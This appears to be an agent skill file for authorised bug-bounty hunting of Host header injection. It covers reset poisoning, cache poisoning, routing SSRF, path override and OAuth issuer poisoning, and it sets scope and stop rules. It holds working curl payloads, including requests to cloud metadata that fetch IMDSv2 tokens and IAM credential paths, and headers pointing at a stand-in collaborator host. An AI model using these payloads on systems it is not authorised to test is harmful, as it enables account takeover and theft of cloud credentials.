---
name: hunt-host-header
description: "Hunt Host Header Injection — password reset poisoning → ATO, web cache poisoning via unkeyed Host/X-Forwarded-Host, routing-based SSRF (Host picks upstream → cloud metadata/internal services), app-side Host fetch (SSR / Server Actions redirect), path-override SSRF/ACL-bypass (X-Original-URL/X-Rewrite-URL), OAuth redirect_uri/issuer poisoning, and absolute-URL link poisoning in emails. High to Critical when it reaches ATO or mass cache poisoning. Built on public Host-header research (PortSwigger 'Practical web cache poisoning' + James Kettle, and the classic password-reset-poisoning class). Use on any forgot-password flow, CDN/reverse-proxy-fronted app, OAuth/OIDC endpoint, or absolute-URL-in-email feature."
sources: portswigger_research, hackerone_public
report_count: 16
---

# HUNT-HOST-HEADER — Host and forwarded-host injection

Anything the app uses to build an absolute URL, pick an upstream, or choose a route: `Host`, `X-Forwarded-Host`, `Forwarded`, `X-Forwarded-Proto`, `X-Forwarded-Port`, `X-Original-URL`, `X-Rewrite-URL`. A reflected host string is a lead. Impact is a token, a cache hit, an internal response, or an OAuth code you actually captured.

Ground the write-up in the behavior you reproduced (PortSwigger / Kettle cache-poisoning research, password-reset host poisoning). Do not invent a CVE or a report id.

## Rails
- In-scope only. Password-reset tests use **your** account and **your** mailbox.
- Do not request resets for other people. Do not poison a shared cache key (use `?cb=<uniq>` and follow `hunt-cache-poison`).
- One header variant at a time. Stop when the token, the second-client body, or the internal response is proven.
- Stop at draft. Never auto-submit.
- Cloud metadata: IMDSv2 GET without a token is not credentials.

## Decision tree

1. **Where does the host go?**
   - Email / invite / webhook / "copy link" → reset poisoning (phase A).
   - HTML or redirect on a cached response → cache (phase B). Confirm with `hunt-cache-poison` rules.
   - Proxy that dials the Host value → routing SSRF (phase C).
   - App itself fetches `https://$Host/...` (SSR / Server Action redirect) → app-side fetch (phase C, second block).
   - Edge path ACL, app honors `X-Original-URL` or `X-Rewrite-URL` → path override (phase D). This does **not** combine with `Host: 169.254.169.254`.
   - OAuth/OIDC issuer or `redirect_uri` → phase E.
2. **Hit the origin.** On a CDN, replacing `Host` often never reaches the app (SNI / vhost mismatch). Keep the real `Host` and add one forwarded header at a time: `X-Forwarded-Host`, then `X-Original-Host`, `X-Forwarded-Scheme` / `X-Forwarded-Proto`, `X-Forwarded-Prefix`, and on Azure App Service / Front Door also `DISGUISED-HOST`. Direct `Host` override is for origin or for a proxy that routes on it.
3. **Unique marker** in the injected host: `h-<uniq>.collab.example` or your Collaborator domain. Search the email, the body, and `Location`.
4. **Stop** at the first phase that meets validation.

## Phase A — links in mail and messages

```bash
curl -s -X POST "https://TARGET/forgot-password" -H "Host: TARGET" \
  -H "X-Forwarded-Host: h-UNIQ.collab" -d "email=YOUR_TEST_ACCOUNT"
curl -s -X POST "https://TARGET/forgot-password" -H "Host: TARGET" \
  -H "Forwarded: host=h-UNIQ.collab" -d "email=YOUR_TEST_ACCOUNT"
curl -s -X POST "https://TARGET/forgot-password" -H "Host: TARGET" \
  -H "X-Forwarded-Proto: http" -H "X-Forwarded-Host: h-UNIQ.collab" -d "email=YOUR_TEST_ACCOUNT"
curl -s -X POST "https://TARGET/forgot-password" \
  -H "Host: TARGET.h-UNIQ.collab" -d "email=YOUR_TEST_ACCOUNT"
```
Also try `X-Host`, `X-Original-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `DISGUISED-HOST: h-UNIQ.collab`, `X-Forwarded-Scheme: http`, `X-Forwarded-Prefix: https://h-UNIQ.collab`, a second `Host` line (some stacks keep the last), and `Host: TARGET:1` / `Host: TARGET:@h-UNIQ.collab` when a parser splits on `:` or `@`. Absolute-form request line, connection still to the real host:

```bash
curl -s --request-target "http://h-UNIQ.collab/forgot-password" -X POST "https://TARGET/forgot-password" \
  -H "Host: TARGET" -d "email=YOUR_TEST_ACCOUNT"
```

**Proof:** the message in **your** inbox contains the token on `h-UNIQ.collab` (or a Collaborator hit when you open the link). A reflected host in the HTTP response is not enough — mailers often pin `SITE_URL`. `X-Forwarded-Proto: http` matters when the token then leaks via `Referer` or a mixed-content load; show that leak, do not assume it.

## Phase B — cache

Follow `hunt-cache-poison`. Short version: marker reflected in an absolute URL, `Vary` does not include the header, a second request **without** the header still contains the marker, cache status is HIT, `Age` > 0. Your `?cb=<uniq>` key only.

## Phase C — routing SSRF

Path stays on the request line. `Host` selects the backend.
```bash
curl -s "https://TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
curl -s "https://TARGET/computeMetadata/v1/" -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"
curl -s "https://TARGET/metadata/instance?api-version=2021-02-01" -H "Host: 169.254.169.254" -H "Metadata: true"
curl -s "https://TARGET/" -H "Host: UNIQUE.collab"
```
**Proof:** metadata body (`ami-id`, `instance`, `computeMetadata`) or an internal app body you can quote. A Collaborator DNS/HTTP hit proves the proxy **resolved** the host — claim SSRF reachability, not metadata theft. An IMDSv2 `401` means you reached IMDS and did not get a role yet. One token hop, then stop:

```bash
TOK=$(curl -s -X PUT "https://TARGET/latest/api/token" -H "Host: 169.254.169.254" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s "https://TARGET/latest/meta-data/iam/security-credentials/" \
  -H "Host: 169.254.169.254" -H "X-aws-ec2-metadata-token: $TOK"
```

If the proxy drops `PUT` or the token header, report reachability only. GCP/Azure headers are required; if this sink cannot add them, do not claim those clouds.

**App-side fetch (not the proxy).** Distinct from routing: the *application* builds `https://$Host/...` (or `X-Forwarded-Host`) and then GETs it — SSR, Server Actions `redirect()`, origin re-fetch after a 302, sitemap, webhook retry. Hit origin with `Host: UNIQUE.collab` **or** keep the real `Host` and spoof `X-Forwarded-Host` / `X-Forwarded-Proto`. Serve a 302 from Collaborator to one internal URL if you need a body.
**Proof:** HTTP on Collaborator from the **app** IP (not only resolver DNS), or an internal body in the app's response. A reflected Host string with no outbound fetch is Phase A/B, not this.

## Phase D — path override

Real Host stays. Diff against the edge's normal denial.
```bash
curl -s "https://TARGET/" -H "X-Original-URL: /admin"
curl -s "https://TARGET/" -H "X-Rewrite-URL: /internal/metrics"
```
**Proof:** status and body differ from `GET /admin` on the edge and match an internal page. Echo of the header is not a bypass.

## Phase E — OAuth / OIDC

```bash
curl -s "https://TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: h-UNIQ.collab"
curl -s "https://TARGET/oauth/authorize?response_type=code&client_id=APP&redirect_uri=https://TARGET/cb" \
  -H "X-Forwarded-Host: h-UNIQ.collab"
```
**Proof:** `issuer`, `authorization_endpoint`, `jwks_uri`, or the redirect that receives the **code** points at your host, and you captured a code issued for your test user. A reflected string with no code is not ATO.

## Validation and severity
| Proven | Claim |
|---|---|
| Reset/invite link host is yours and the token is on it | ATO of accounts that request mail. Critical if any user, not only you |
| Second client receives the poisoned cached body | Cache poison (`hunt-cache-poison` / `hunt-xss`) |
| Metadata or internal body | SSRF. Critical only if the credentials or the admin data are in the body |
| OAuth code captured on your host | ATO. Critical |
| Header reflected, uncached, not in the email, no internal body | Not worth a report |

False friends: CDN error page that echoes `Host`; `Vary` including the header (keyed, not poisoned); mail link still on the real domain.

## Chains
- Reset token → one login as **your** user to prove the token works, then describe the victim path. Do not take over a third party.
- Cached absolute script URL → `hunt-xss` once, on the cache-buster.
- Routing SSRF → `hunt-ssrf` impact rules (IMDSv2, one internal request).
- App-side Host fetch → same `hunt-ssrf` bar; the callback IP must be the app, not only a resolver.
- `X-Original-URL` → `hunt-auth-bypass` only with the internal response quoted.
- OIDC `jwks_uri` on your host → token forgery only if you actually mint a token the API accepts. One request.

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
